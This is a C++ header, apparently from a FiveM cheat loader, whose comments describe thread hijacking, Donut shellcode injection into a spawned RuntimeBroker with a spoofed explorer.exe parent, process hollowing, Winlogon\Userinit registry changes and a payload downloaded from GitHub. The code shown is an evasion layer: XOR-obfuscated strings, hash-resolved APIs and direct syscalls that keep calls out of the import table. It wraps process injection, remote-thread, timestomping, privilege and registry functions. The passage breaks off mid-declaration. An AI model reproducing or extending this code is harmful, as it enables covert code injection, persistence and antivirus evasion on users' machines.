#pragma once
//
// Functions.hpp
// -----------------------------------------------------------------------------
// Shift+F6  — Thread hijacking real (SuspendThread + Get/SetThreadContext)
//             do loader Donut embarcado contra um host RuntimeBroker novo e
//             dedicado, criado com parent=explorer.exe. Nunca reutiliza a thread
//             sequestrada pelo F# (o loader roda em outro processo) e registra
//             o host para o Shift+F7. O shellcode retorna ao CONTEXT original
//             via trampoline -> NtContinue, exatamente como no ThreadHijack.fsx.
//             Insert abre o menu do cheat enquanto o FiveM estiver aberto.
// Shift+F7  — Encerra o host RuntimeBroker e todo o seu job, limpa o próprio
//             fluxo e os alvos de serviço. Também devolve Winlogon\Userinit ao
//             padrão do Windows.
// Shift+F8  — Encerra o RuntimeBroker que hospeda o loader e o child
//             hollowed rastreado, desfazendo a injeção sem executar o scrub do F7.
// Shift+F9  — Reservado (no-op).

//
// Todas as strings via xorstr. Todas as WinAPIs via api:: (sc::Resolve+hash)
// ou nt:: (direct syscall). Nenhuma chamada direta ao kernel32/user32/advapi32/
// winhttp fica no IAT.
//

#include "xorstr.hpp"
#include "syscalls.hpp"
#include "cheat_embedded.hpp"
// Berok vem via HTTPS do GitHub (sem embed), ver DownloadBerokFromGitHub()
#include <algorithm>

#include <array>
#include <atomic>
#include <cstring>
#include <cstdint>
#include <cwchar>
#include <memory>
#include <string>
#include <string_view>
#include <map>
#include <mutex>
#include <unordered_set>
#include <utility>
#include <vector>


#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <tlhelp32.h>
#include <winsvc.h>
#include <winhttp.h>

#include <cstdio>

// =============================================================================
// api::  wrappers indiretos tipados — resolvidos via sc::Resolve + xorstr.
// =============================================================================
namespace api
{
    // typedefs
    using fn_SetFilePointerEx                  = BOOL  (WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD);
    using fn_SetEndOfFile                      = BOOL  (WINAPI*)(HANDLE);
    using fn_GetFileTime                       = BOOL  (WINAPI*)(HANDLE, LPFILETIME, LPFILETIME, LPFILETIME);
    using fn_SetFileTime                       = BOOL  (WINAPI*)(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
    using fn_CreateFileW                       = HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using fn_CloseHandle_                      = BOOL  (WINAPI*)(HANDLE);
    using fn_GetCurrentProcessId               = DWORD (WINAPI*)();
    using fn_Beep                              = BOOL  (WINAPI*)(DWORD, DWORD);
    using fn_OpenProcess                       = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    using fn_QueryFullProcessImageNameW        = BOOL  (WINAPI*)(HANDLE, DWORD, LPWSTR, PDWORD);
    using fn_CreateProcessW                    = BOOL  (WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                                                                  BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
    using fn_GetThreadContext                  = BOOL  (WINAPI*)(HANDLE, LPCONTEXT);
    using fn_SetThreadContext                  = BOOL  (WINAPI*)(HANDLE, const CONTEXT*);
    using fn_ResumeThread                      = DWORD (WINAPI*)(HANDLE);
    using fn_SuspendThread                     = DWORD (WINAPI*)(HANDLE);
    using fn_TerminateThread                   = BOOL  (WINAPI*)(HANDLE, DWORD);
    using fn_OpenThread                        = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    using fn_Thread32First                     = BOOL  (WINAPI*)(HANDLE, LPTHREADENTRY32);
    using fn_Thread32Next                      = BOOL  (WINAPI*)(HANDLE, LPTHREADENTRY32);
    using fn_VirtualAllocEx                    = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    using fn_VirtualProtectEx                  = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    using fn_VirtualProtect_                   = BOOL  (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD);
    using fn_WriteProcessMemory                = BOOL  (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    using fn_FlushInstructionCache             = BOOL  (WINAPI*)(HANDLE, LPCVOID, SIZE_T);
    using fn_InitProcThreadAttrList            = BOOL  (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    using fn_UpdateProcThreadAttribute_        = BOOL  (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    using fn_DeleteProcThreadAttrList          = VOID  (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST);
    using fn_Sleep_                            = VOID  (WINAPI*)(DWORD);
    using fn_LocalAlloc_                       = HLOCAL(WINAPI*)(UINT, SIZE_T);
    using fn_LocalFree_                        = HLOCAL(WINAPI*)(HLOCAL);
    using fn_GetProcessHeap_                   = HANDLE(WINAPI*)();
    using fn_HeapAlloc_                        = LPVOID(WINAPI*)(HANDLE, DWORD, SIZE_T);
    using fn_HeapFree_                         = BOOL  (WINAPI*)(HANDLE, DWORD, LPVOID);
    using fn_GetSystemDirectoryW_              = UINT  (WINAPI*)(LPWSTR, UINT);
    using fn_TerminateProcess_                 = BOOL  (WINAPI*)(HANDLE, UINT);
    using fn_GetModuleHandleW_                 = HMODULE(WINAPI*)(LPCWSTR);
    using fn_GetProcAddress_                   = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    using fn_GetCurrentProcess_                = HANDLE(WINAPI*)();
    using fn_GetLastError_                     = DWORD (WINAPI*)();
    using fn_SetLastError_                     = VOID  (WINAPI*)(DWORD);
    using fn_LoadLibraryA_                     = HMODULE(WINAPI*)(LPCSTR);
    using fn_LoadLibraryW_                     = HMODULE(WINAPI*)(LPCWSTR);
    using fn_CreateRemoteThread_               = HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    using fn_WaitForSingleObject_              = DWORD (WINAPI*)(HANDLE, DWORD);
    using fn_GetExitCodeThread_                = BOOL  (WINAPI*)(HANDLE, LPDWORD);
    using fn_VirtualFreeEx_                    = BOOL  (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD);
    using fn_GetModuleFileNameW_               = DWORD (WINAPI*)(HMODULE, LPWSTR, DWORD);
    using fn_Module32FirstW_                   = BOOL  (WINAPI*)(HANDLE, LPMODULEENTRY32W);
    using fn_Module32NextW_                    = BOOL  (WINAPI*)(HANDLE, LPMODULEENTRY32W);

    using fn_OpenProcessToken_                 = BOOL  (WINAPI*)(HANDLE, DWORD, PHANDLE);
    using fn_LookupPrivilegeValueW_            = BOOL  (WINAPI*)(LPCWSTR, LPCWSTR, PLUID);
    using fn_AdjustTokenPrivileges_            = BOOL  (WINAPI*)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
    using fn_OpenSCManagerW_                   = SC_HANDLE(WINAPI*)(LPCWSTR, LPCWSTR, DWORD);
    using fn_OpenServiceW_                     = SC_HANDLE(WINAPI*)(SC_HANDLE, LPCWSTR, DWORD);
    using fn_QueryServiceStatusEx_             = BOOL  (WINAPI*)(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);
    using fn_CloseServiceHandle_               = BOOL  (WINAPI*)(SC_HANDLE);

    using fn_CreateJobObjectW_                 = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, LPCWSTR);
    using fn_SetInformationJobObject_          = BOOL  (WINAPI*)(HANDLE, JOBOBJECTINFOCLASS, LPVOID, DWORD);
    using fn_AssignProcessToJobObject_         = BOOL  (WINAPI*)(HANDLE, HANDLE);

    using fn_GetTickCount_                     = DWORD (WINAPI*)();
    using fn_CreateThread_                     = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                                                   LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    using fn_TrySubmitThreadpoolCallback_      = BOOL  (WINAPI*)(PTP_SIMPLE_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
    using fn_CallbackMayRunLong_               = BOOL  (WINAPI*)(PTP_CALLBACK_INSTANCE);

    using fn_RegOpenKeyExW_                    = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    using fn_RegDeleteValueW_                  = LONG (WINAPI*)(HKEY, LPCWSTR);
    using fn_RegCloseKey_                      = LONG (WINAPI*)(HKEY);
    using fn_RegQueryValueExW_                 = LONG (WINAPI*)(HKEY, LPCWSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    using fn_RegSetValueExW_                   = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);

    using fn_WinHttpOpen_                      = HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    using fn_WinHttpConnect_                   = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    using fn_WinHttpOpenRequest_               = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    using fn_WinHttpSendRequest_               = BOOL  (WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    using fn_WinHttpReceiveResponse_           = BOOL  (WINAPI*)(HINTERNET, LPVOID);
    using fn_WinHttpQueryHeaders_              = BOOL  (WINAPI*)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
    using fn_WinHttpReadData_                  = BOOL  (WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD);
    using fn_WinHttpCloseHandle_               = BOOL  (WINAPI*)(HINTERNET);

    namespace cache
    {
        inline fn_SetFilePointerEx              pSetFilePointerEx             = nullptr;
        inline fn_SetEndOfFile                  pSetEndOfFile                 = nullptr;
        inline fn_GetFileTime                   pGetFileTime                  = nullptr;
        inline fn_SetFileTime                   pSetFileTime                  = nullptr;
        inline fn_CreateFileW                   pCreateFileW                  = nullptr;
        inline fn_CloseHandle_                  pCloseHandle_                 = nullptr;
        inline fn_GetCurrentProcessId           pGetCurrentProcessId          = nullptr;
        inline fn_Beep                         pBeep                         = nullptr;
        inline fn_OpenProcess                   pOpenProcess                  = nullptr;
        inline fn_QueryFullProcessImageNameW    pQueryFullProcessImageNameW   = nullptr;
        inline fn_CreateProcessW                pCreateProcessW               = nullptr;
        inline fn_GetThreadContext              pGetThreadContext             = nullptr;
        inline fn_SetThreadContext              pSetThreadContext             = nullptr;
        inline fn_ResumeThread                  pResumeThread                 = nullptr;
        inline fn_SuspendThread                 pSuspendThread                = nullptr;
        inline fn_TerminateThread               pTerminateThread              = nullptr;
        inline fn_OpenThread                    pOpenThread                   = nullptr;
        inline fn_Thread32First                 pThread32First                = nullptr;
        inline fn_Thread32Next                  pThread32Next                 = nullptr;
        inline fn_VirtualAllocEx                pVirtualAllocEx               = nullptr;
        inline fn_VirtualProtectEx              pVirtualProtectEx             = nullptr;
        inline fn_VirtualProtect_               pVirtualProtect_              = nullptr;
        inline fn_WriteProcessMemory            pWriteProcessMemory           = nullptr;
        inline fn_FlushInstructionCache         pFlushInstructionCache        = nullptr;
        inline fn_InitProcThreadAttrList        pInitProcThreadAttrList       = nullptr;
        inline fn_UpdateProcThreadAttribute_    pUpdateProcThreadAttribute_   = nullptr;
        inline fn_DeleteProcThreadAttrList      pDeleteProcThreadAttrList     = nullptr;
        inline fn_Sleep_                        pSleep_                       = nullptr;
        inline fn_LocalAlloc_                   pLocalAlloc_                  = nullptr;
        inline fn_LocalFree_                    pLocalFree_                   = nullptr;
        inline fn_GetProcessHeap_               pGetProcessHeap_              = nullptr;
        inline fn_HeapAlloc_                    pHeapAlloc_                   = nullptr;
        inline fn_HeapFree_                     pHeapFree_                    = nullptr;
        inline fn_GetSystemDirectoryW_          pGetSystemDirectoryW_         = nullptr;
        inline fn_TerminateProcess_             pTerminateProcess_            = nullptr;
        inline fn_GetModuleHandleW_             pGetModuleHandleW_            = nullptr;
        inline fn_GetProcAddress_               pGetProcAddress_              = nullptr;
        inline fn_GetCurrentProcess_            pGetCurrentProcess_           = nullptr;
        inline fn_GetLastError_                 pGetLastError_                = nullptr;
        inline fn_SetLastError_                 pSetLastError_                = nullptr;
        inline fn_LoadLibraryA_                 pLoadLibraryA_                = nullptr;
        inline fn_LoadLibraryW_                 pLoadLibraryW_                = nullptr;
        inline fn_CreateRemoteThread_           pCreateRemoteThread_          = nullptr;
        inline fn_WaitForSingleObject_          pWaitForSingleObject_         = nullptr;
        inline fn_GetExitCodeThread_            pGetExitCodeThread_           = nullptr;
        inline fn_VirtualFreeEx_                pVirtualFreeEx_               = nullptr;
        inline fn_GetModuleFileNameW_           pGetModuleFileNameW_          = nullptr;
        inline fn_Module32FirstW_               pModule32FirstW_              = nullptr;
        inline fn_Module32NextW_                pModule32NextW_               = nullptr;

        inline fn_OpenProcessToken_             pOpenProcessToken_            = nullptr;
        inline fn_LookupPrivilegeValueW_        pLookupPrivilegeValueW_       = nullptr;
        inline fn_AdjustTokenPrivileges_        pAdjustTokenPrivileges_       = nullptr;
        inline fn_OpenSCManagerW_               pOpenSCManagerW_              = nullptr;
        inline fn_OpenServiceW_                 pOpenServiceW_                = nullptr;
        inline fn_QueryServiceStatusEx_         pQueryServiceStatusEx_        = nullptr;
        inline fn_CloseServiceHandle_           pCloseServiceHandle_          = nullptr;
        inline fn_CreateJobObjectW_             pCreateJobObjectW_            = nullptr;
        inline fn_SetInformationJobObject_      pSetInformationJobObject_     = nullptr;
        inline fn_AssignProcessToJobObject_     pAssignProcessToJobObject_    = nullptr;

        inline fn_GetTickCount_                 pGetTickCount_                = nullptr;
        inline fn_CreateThread_                 pCreateThread_                = nullptr;
        inline fn_TrySubmitThreadpoolCallback_  pTrySubmitThreadpoolCallback_ = nullptr;
        inline fn_CallbackMayRunLong_           pCallbackMayRunLong_          = nullptr;

        inline fn_RegOpenKeyExW_                pRegOpenKeyExW_               = nullptr;
        inline fn_RegDeleteValueW_              pRegDeleteValueW_             = nullptr;
        inline fn_RegCloseKey_                  pRegCloseKey_                 = nullptr;
        inline fn_RegQueryValueExW_             pRegQueryValueExW_            = nullptr;
        inline fn_RegSetValueExW_               pRegSetValueExW_              = nullptr;

        inline fn_WinHttpOpen_                  pWinHttpOpen_                 = nullptr;
        inline fn_WinHttpConnect_               pWinHttpConnect_              = nullptr;
        inline fn_WinHttpOpenRequest_           pWinHttpOpenRequest_          = nullptr;
        inline fn_WinHttpSendRequest_           pWinHttpSendRequest_          = nullptr;
        inline fn_WinHttpReceiveResponse_       pWinHttpReceiveResponse_      = nullptr;
        inline fn_WinHttpQueryHeaders_          pWinHttpQueryHeaders_         = nullptr;
        inline fn_WinHttpReadData_              pWinHttpReadData_             = nullptr;
        inline fn_WinHttpCloseHandle_           pWinHttpCloseHandle_          = nullptr;
    }

    template <class T>
    inline T Resolve(T& slot, const char* dll, const char* fn)
    {
        if (!slot) slot = reinterpret_cast<T>(sc::Resolve(dll, fn));
        return slot;
    }

    // ---------------- kernel32 ----------------
    inline BOOL    SetFilePointerEx_(HANDLE h, LARGE_INTEGER d, PLARGE_INTEGER np, DWORD m)
    { return Resolve(cache::pSetFilePointerEx, xorstr("kernel32.dll"), xorstr("SetFilePointerEx"))(h, d, np, m); }

    inline BOOL    SetEndOfFile_(HANDLE h)
    { return Resolve(cache::pSetEndOfFile, xorstr("kernel32.dll"), xorstr("SetEndOfFile"))(h); }

    inline BOOL    GetFileTime_(HANDLE h, LPFILETIME c, LPFILETIME a, LPFILETIME w)
    { return Resolve(cache::pGetFileTime, xorstr("kernel32.dll"), xorstr("GetFileTime"))(h, c, a, w); }

    inline BOOL    SetFileTime_(HANDLE h, const FILETIME* c, const FILETIME* a, const FILETIME* w)
    { return Resolve(cache::pSetFileTime, xorstr("kernel32.dll"), xorstr("SetFileTime"))(h, c, a, w); }

    inline HANDLE  CreateFileW_(LPCWSTR p, DWORD a, DWORD s, LPSECURITY_ATTRIBUTES sa, DWORD d, DWORD f, HANDLE t)
    { return Resolve(cache::pCreateFileW, xorstr("kernel32.dll"), xorstr("CreateFileW"))(p, a, s, sa, d, f, t); }

    inline BOOL    CloseH(HANDLE h)
    { return Resolve(cache::pCloseHandle_, xorstr("kernel32.dll"), xorstr("CloseHandle"))(h); }

    inline DWORD   GetCurrentProcessId_()
    { return Resolve(cache::pGetCurrentProcessId, xorstr("kernel32.dll"), xorstr("GetCurrentProcessId"))(); }

    inline BOOL    Beep_(DWORD frequency, DWORD duration)
    { return Resolve(cache::pBeep, xorstr("kernel32.dll"), xorstr("Beep"))(frequency, duration); }

    inline HANDLE  OpenProcess_(DWORD a, BOOL i, DWORD pid)
    { return Resolve(cache::pOpenProcess, xorstr("kernel32.dll"), xorstr("OpenProcess"))(a, i, pid); }

    inline BOOL    QueryFullProcessImageNameW_(HANDLE h, DWORD f, LPWSTR b, PDWORD s)
    { return Resolve(cache::pQueryFullProcessImageNameW, xorstr("kernel32.dll"), xorstr("QueryFullProcessImageNameW"))(h, f, b, s); }

    inline BOOL    CreateProcessW_(LPCWSTR app, LPWSTR cmd, LPSECURITY_ATTRIBUTES ps, LPSECURITY_ATTRIBUTES ts,
                                   BOOL inh, DWORD flg, LPVOID env, LPCWSTR cd,
                                   LPSTARTUPINFOW si, LPPROCESS_INFORMATION pi)
    { return Resolve(cache::pCreateProcessW, xorstr("kernel32.dll"), xorstr("CreateProcessW"))(app, cmd, ps, ts, inh, flg, env, cd, si, pi); }

    inline BOOL    GetThreadContext_(HANDLE h, LPCONTEXT c)
    { return Resolve(cache::pGetThreadContext, xorstr("kernel32.dll"), xorstr("GetThreadContext"))(h, c); }

    inline BOOL    SetThreadContext_(HANDLE h, const CONTEXT* c)
    { return Resolve(cache::pSetThreadContext, xorstr("kernel32.dll"), xorstr("SetThreadContext"))(h, c); }

    inline DWORD   ResumeThread_(HANDLE h)
    { return Resolve(cache::pResumeThread, xorstr("kernel32.dll"), xorstr("ResumeThread"))(h); }

    inline DWORD   SuspendThread_(HANDLE h)
    { return Resolve(cache::pSuspendThread, xorstr("kernel32.dll"), xorstr("SuspendThread"))(h); }

    inline BOOL    TerminateThread_(HANDLE h, DWORD c)
    { return Resolve(cache::pTerminateThread, xorstr("kernel32.dll"), xorstr("TerminateThread"))(h, c); }

    inline HANDLE  OpenThread_(DWORD access, BOOL inherit, DWORD tid)
    { return Resolve(cache::pOpenThread, xorstr("kernel32.dll"), xorstr("OpenThread"))(access, inherit, tid); }

    inline BOOL    Thread32First_(HANDLE snap, LPTHREADENTRY32 te)
    { return Resolve(cache::pThread32First, xorstr("kernel32.dll"), xorstr("Thread32First"))(snap, te); }

    inline BOOL    Thread32Next_(HANDLE snap, LPTHREADENTRY32 te)
    { return Resolve(cache::pThread32Next, xorstr("kernel32.dll"), xorstr("Thread32Next"))(snap, te); }

    inline LPVOID  VirtualAllocEx_(HANDLE h, LPVOID a, SIZE_T s, DWORD at, DWORD p)
    { return Resolve(cache::pVirtualAllocEx, xorstr("kernel32.dll"), xorstr("VirtualAllocEx"))(h, a, s, at, p); }

    inline BOOL    VirtualProtectEx_(HANDLE h, LPVOID a, SIZE_T s, DWORD np, PDWORD op)
    { return Resolve(cache::pVirtualProtectEx, xorstr("kernel32.dll"), xorstr("VirtualProtectEx"))(h, a, s, np, op); }

    inline BOOL    VirtualProtect_(LPVOID a, SIZE_T s, DWORD np, PDWORD op)
    { return Resolve(cache::pVirtualProtect_, xorstr("kernel32.dll"), xorstr("VirtualProtect"))(a, s, np, op); }

    inline BOOL    WriteProcessMemory_(HANDLE h, LPVOID a, LPCVOID b, SIZE_T s, SIZE_T* w)
    { return Resolve(cache::pWriteProcessMemory, xorstr("kernel32.dll"), xorstr("WriteProcessMemory"))(h, a, b, s, w); }

    inline BOOL    FlushInstructionCache_(HANDLE h, LPCVOID a, SIZE_T s)
    { return Resolve(cache::pFlushInstructionCache, xorstr("kernel32.dll"), xorstr("FlushInstructionCache"))(h, a, s); }

    inline BOOL    InitProcThreadAttrList_(LPPROC_THREAD_ATTRIBUTE_LIST l, DWORD c, DWORD f, PSIZE_T s)
    { return Resolve(cache::pInitProcThreadAttrList, xorstr("kernel32.dll"), xorstr("InitializeProcThreadAttributeList"))(l, c, f, s); }

    inline BOOL    UpdateProcThreadAttribute_(LPPROC_THREAD_ATTRIBUTE_LIST l, DWORD f, DWORD_PTR a, PVOID v, SIZE_T s, PVOID p, PSIZE_T r)
    { return Resolve(cache::pUpdateProcThreadAttribute_, xorstr("kernel32.dll"), xorstr("UpdateProcThreadAttribute"))(l, f, a, v, s, p, r); }

    inline VOID    DeleteProcThreadAttrList_(LPPROC_THREAD_ATTRIBUTE_LIST l)
    { Resolve(cache::pDeleteProcThreadAttrList, xorstr("kernel32.dll"), xorstr("DeleteProcThreadAttributeList"))(l); }

    inline VOID    Sleep_(DWORD ms)
    { Resolve(cache::pSleep_, xorstr("kernel32.dll"), xorstr("Sleep"))(ms); }

    inline HLOCAL  LocalAlloc_(UINT f, SIZE_T b)
    { return Resolve(cache::pLocalAlloc_, xorstr("kernel32.dll"), xorstr("LocalAlloc"))(f, b); }

    inline HLOCAL  LocalFree_(HLOCAL m)
    { return Resolve(cache::pLocalFree_, xorstr("kernel32.dll"), xorstr("LocalFree"))(m); }

    inline HANDLE  GetProcessHeap_()
    { return Resolve(cache::pGetProcessHeap_, xorstr("kernel32.dll"), xorstr("GetProcessHeap"))(); }

    inline LPVOID  HeapAlloc_(HANDLE h, DWORD f, SIZE_T b)
    { return Resolve(cache::pHeapAlloc_, xorstr("kernel32.dll"), xorstr("HeapAlloc"))(h, f, b); }

    inline BOOL    HeapFree_(HANDLE h, DWORD f, LPVOID p)
    { return Resolve(cache::pHeapFree_, xorstr("kernel32.dll"), xorstr("HeapFree"))(h, f, p); }

    inline UINT    GetSystemDirectoryW_(LPWSTR b, UINT n)
    { return Resolve(cache::pGetSystemDirectoryW_, xorstr("kernel32.dll"), xorstr("GetSystemDirectoryW"))(b, n); }

    inline BOOL    TerminateProcess_(HANDLE h, UINT code)
    { return Resolve(cache::pTerminateProcess_, xorstr("kernel32.dll"), xorstr("TerminateProcess"))(h, code); }

    inline HMODULE GetModuleHandleW_(LPCWSTR n)
    { return Resolve(cache::pGetModuleHandleW_, xorstr("kernel32.dll"), xorstr("GetModuleHandleW"))(n); }

    inline FARPROC GetProcAddr(HMODULE m, LPCSTR n)
    { return Resolve(cache::pGetProcAddress_, xorstr("kernel32.dll"), xorstr("GetProcAddress"))(m, n); }

    inline HANDLE  GetCurrentProcess_()
    { return Resolve(cache::pGetCurrentProcess_, xorstr("kernel32.dll"), xorstr("GetCurrentProcess"))(); }

    inline DWORD   GetLastError_()
    { return Resolve(cache::pGetLastError_, xorstr("kernel32.dll"), xorstr("GetLastError"))(); }

    inline VOID    SetLastError_(DWORD e)
    { Resolve(cache::pSetLastError_, xorstr("kernel32.dll"), xorstr("SetLastError"))(e); }

    inline HMODULE LoadLibraryA_(LPCSTR n)
    { return Resolve(cache::pLoadLibraryA_, xorstr("kernel32.dll"), xorstr("LoadLibraryA"))(n); }

    inline HMODULE LoadLibraryW_(LPCWSTR n)
    { return Resolve(cache::pLoadLibraryW_, xorstr("kernel32.dll"), xorstr("LoadLibraryW"))(n); }

    inline HANDLE  CreateRemoteThread_(HANDLE p, LPSECURITY_ATTRIBUTES sa, SIZE_T stack,
                                       LPTHREAD_START_ROUTINE fn, LPVOID param, DWORD flags, LPDWORD tid)
    { return Resolve(cache::pCreateRemoteThread_, xorstr("kernel32.dll"), xorstr("CreateRemoteThread"))(p, sa, stack, fn, param, flags, tid); }

    inline DWORD   WaitForSingleObject_(HANDLE h, DWORD ms)
    { return Resolve(cache::pWaitForSingleObject_, xorstr("kernel32.dll"), xorstr("WaitForSingleObject"))(h, ms); }

    inline BOOL    GetExitCodeThread_(HANDLE h, LPDWORD code)
    { return Resolve(cache::pGetExitCodeThread_, xorstr("kernel32.dll"), xorstr("GetExitCodeThread"))(h, code); }

    inline BOOL    VirtualFreeEx_(HANDLE p, LPVOID a, SIZE_T s, DWORD t)
    { return Resolve(cache::pVirtualFreeEx_, xorstr("kernel32.dll"), xorstr("VirtualFreeEx"))(p, a, s, t); }

    inline DWORD   GetModuleFileNameW_(HMODULE m, LPWSTR b, DWORD n)
    { return Resolve(cache::pGetModuleFileNameW_, xorstr("kernel32.dll"), xorstr("GetModuleFileNameW"))(m, b, n); }

    inline BOOL    Module32FirstW_(HANDLE s, LPMODULEENTRY32W e)
    { return Resolve(cache::pModule32FirstW_, xorstr("kernel32.dll"), xorstr("Module32FirstW"))(s, e); }

    inline BOOL    Module32NextW_(HANDLE s, LPMODULEENTRY32W e)
    { return Resolve(cache::pModule32NextW_, xorstr("kernel32.dll"), xorstr("Module32NextW"))(s, e); }

    // ---------------- advapi32 ----------------
    inline BOOL    OpenProcessToken_(HANDLE p, DWORD a, PHANDLE t)
    { return Resolve(cache::pOpenProcessToken_, xorstr("advapi32.dll"), xorstr("OpenProcessToken"))(p, a, t); }

    inline BOOL    LookupPrivilegeValueW_(LPCWSTR sys, LPCWSTR name, PLUID luid)
    { return Resolve(cache::pLookupPrivilegeValueW_, xorstr("advapi32.dll"), xorstr("LookupPrivilegeValueW"))(sys, name, luid); }

    inline BOOL    AdjustTokenPrivileges_(HANDLE t, BOOL dis, PTOKEN_PRIVILEGES np, DWORD len, PTOKEN_PRIVILEGES op, PDWORD ret)
    { return Resolve(cache::pAdjustTokenPrivileges_, xorstr("advapi32.dll"), xorstr("AdjustTokenPrivileges"))(t, dis, np, len, op, ret); }

    inline SC_HANDLE OpenSCManagerW_(LPCWSTR m, LPCWSTR db, DWORD a)
    { return Resolve(cache::pOpenSCManagerW_, xorstr("advapi32.dll"), xorstr("OpenSCManagerW"))(m, db, a); }

    inline SC_HANDLE OpenServiceW_(SC_HANDLE scm, LPCWSTR name, DWORD a)
    { return Resolve(cache::pOpenServiceW_, xorstr("advapi32.dll"), xorstr("OpenServiceW"))(scm, name, a); }

    inline BOOL    QueryServiceStatusEx_(SC_HANDLE s, SC_STATUS_TYPE t, LPBYTE b, DWORD bs, LPDWORD n)
    { return Resolve(cache::pQueryServiceStatusEx_, xorstr("advapi32.dll"), xorstr("QueryServiceStatusEx"))(s, t, b, bs, n); }

    inline BOOL    CloseServiceHandle_(SC_HANDLE h)
    { return Resolve(cache::pCloseServiceHandle_, xorstr("advapi32.dll"), xorstr("CloseServiceHandle"))(h); }

    inline HANDLE  CreateJobObjectW_(LPSECURITY_ATTRIBUTES sa, LPCWSTR nm)
    { return Resolve(cache::pCreateJobObjectW_, xorstr("kernel32.dll"), xorstr("CreateJobObjectW"))(sa, nm); }

    inline BOOL    SetInformationJobObject_(HANDLE j, JOBOBJECTINFOCLASS c, LPVOID info, DWORD len)
    { return Resolve(cache::pSetInformationJobObject_, xorstr("kernel32.dll"), xorstr("SetInformationJobObject"))(j, c, info, len); }

    inline BOOL    AssignProcessToJobObject_(HANDLE j, HANDLE p)
    { return Resolve(cache::pAssignProcessToJobObject_, xorstr("kernel32.dll"), xorstr("AssignProcessToJobObject"))(j, p); }

    inline DWORD     GetTickCount_()
    { return Resolve(cache::pGetTickCount_, xorstr("kernel32.dll"), xorstr("GetTickCount"))(); }

    inline HANDLE    CreateThread_(LPSECURITY_ATTRIBUTES sa, SIZE_T stack,
                                    LPTHREAD_START_ROUTINE fn, LPVOID p, DWORD flags, LPDWORD tid)
    { return Resolve(cache::pCreateThread_, xorstr("kernel32.dll"), xorstr("CreateThread"))(sa, stack, fn, p, flags, tid); }

    inline BOOL      TrySubmitThreadpoolCallback_(PTP_SIMPLE_CALLBACK cb, PVOID ctx, PTP_CALLBACK_ENVIRON env)
    { return Resolve(cache::pTrySubmitThreadpoolCallback_, xorstr("kernel32.dll"), xorstr("TrySubmitThreadpoolCallback"))(cb, ctx, env); }

    inline BOOL      CallbackMayRunLong_(PTP_CALLBACK_INSTANCE inst)
    { return Resolve(cache::pCallbackMayRunLong_, xorstr("kernel32.dll"), xorstr("CallbackMayRunLong"))(inst); }

    template <class Fn>
    inline void InvokePoolTask(Fn& fn) noexcept
    {
        try
        {
            fn();
        }
        catch (...)
        {
            // A worker exception must not cross the Windows thread-pool
            // boundary.  Let the action fail closed instead of terminating
            // the host through the CRT's unhandled-exception path.
        }
    }

    template <class Fn>
    inline void DestroyPoolTask(Fn* fn) noexcept
    {
        try
        {
            delete fn;
        }
        catch (...)
        {
        }
    }

    template <class Fn>
    inline bool SubmitPoolTask(Fn fn)
    {
        auto* heapFn = new (std::nothrow) Fn(std::move(fn));
        if (!heapFn) return false;

        PTP_SIMPLE_CALLBACK trampoline =
            +[](PTP_CALLBACK_INSTANCE inst, PVOID p) -> void
            {
                auto* f = static_cast<Fn*>(p);
                __try
                {
                    CallbackMayRunLong_(inst);
                    InvokePoolTask(*f);
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                    // Keep access violations and other SEH faults from
                    // escaping a worker callback into the host process.
                }

                __try
                {
                    DestroyPoolTask(f);
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                }
            };

        if (!TrySubmitThreadpoolCallback_(trampoline, heapFn, nullptr))
        {
            delete heapFn;
            return false;
        }
        return true;
    }

    inline LONG      RegOpenKeyExW_(HKEY k, LPCWSTR sub, DWORD opt, REGSAM sam, PHKEY out)
